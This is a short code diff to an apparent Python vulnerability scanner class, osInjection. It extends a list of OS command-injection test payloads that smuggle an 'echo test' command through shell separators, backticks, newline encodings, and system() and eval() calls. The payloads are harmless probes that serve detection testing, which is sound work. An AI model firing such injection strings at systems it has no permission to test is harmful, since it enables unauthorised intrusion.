@@ -20,7 +20,7 @@ class osInjection:
         self.headers = headers
         self.data = data
         self.endpoint = endpoint
-        self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');"]
+        self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');","response.write test", ":response.write test"]
         self.PostOsInject = PostOsInject
         self.GetOsinject = GetOsinject
 
